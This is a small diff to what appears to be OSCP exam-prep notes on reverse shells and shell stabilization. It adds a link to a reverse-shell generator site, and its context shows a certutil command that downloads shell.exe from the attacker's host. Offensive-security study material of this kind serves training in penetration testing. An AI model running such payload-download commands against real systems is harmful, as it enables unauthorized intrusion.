@@ -2,6 +2,8 @@
 # 07 – SHELLS & STABILIZATION (OSCP 2025)
 ######################################################################
 
+revshells: https://www.revshells.com/
+
 ===============================
 # 1. Netcat Reverse Shells
 ===============================
@@ -72,3 +74,4 @@ certutil -urlcache -split -f http://$localip/shell.exe shell.exe
 ######################################################################
 # END OF 07_SHELLS_AND_STABILIZATION.TXT
 ######################################################################
+
